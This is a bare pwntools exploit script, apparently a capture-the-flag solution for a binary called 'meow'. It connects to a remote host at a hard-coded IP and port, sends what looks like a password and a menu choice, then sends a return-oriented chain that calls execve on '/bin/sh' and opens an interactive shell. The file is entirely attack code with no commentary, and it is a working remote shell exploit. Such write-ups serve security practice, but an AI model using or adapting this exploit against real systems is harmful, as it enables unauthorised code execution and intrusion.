from pwn import *
from time import sleep

context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'x86_64'

pop_rdi = 0x14036
bin_sh = 0x14029
execve = 0x14000

#  r = process('./meow')
#  gdb.attach(r, '''
#  ''')
r = remote('110.10.212.139', 50410)

r.sendline('$W337k!++y')
print r.recvuntil('= ')
r.sendline('3')
print r.recvuntil('>>>')
r.send(flat(pop_rdi, bin_sh, execve))

r.interactive()
